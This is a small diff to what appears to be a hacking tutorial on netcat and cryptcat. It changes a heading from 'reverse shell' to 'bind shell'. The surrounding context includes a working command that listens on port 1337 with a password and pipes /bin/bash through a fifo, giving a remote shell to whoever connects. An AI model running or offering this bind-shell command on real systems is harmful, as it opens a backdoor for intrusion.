@@ -79,7 +79,7 @@ Now chat with another host
 
 We can set -k parameter to make our communication password protected
 
-Ok let's try encrypted reverse shell using cryptcat 
+Ok let's try encrypted bind shell using cryptcat 
 ~~~
 
 # cryptcat -k hacker -l -p 1337 0<myfifo | /bin/bash 1>myfifo
